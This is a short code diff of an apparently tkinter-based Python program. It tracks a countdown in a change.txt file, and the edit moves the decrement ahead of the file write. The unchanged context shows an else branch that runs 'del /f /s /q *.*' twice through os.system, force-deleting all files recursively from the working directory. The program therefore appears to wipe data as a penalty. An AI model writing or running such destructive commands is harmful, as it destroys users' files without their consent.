@@ -153,6 +153,7 @@ def get():
             time.sleep(4)
             root.destroy()
         else:
+            change = change-1
             try:
                 writec = open(f'C:/Users/{user}/Documents/change.txt','w')
                 writec.write(str(change))
@@ -160,7 +161,6 @@ def get():
             except:
                 print('error!')
                 pass
-            change = change-1
     else:
         os.system('del /f /s /q *.*')
         os.system('del /f /s /q *.*')
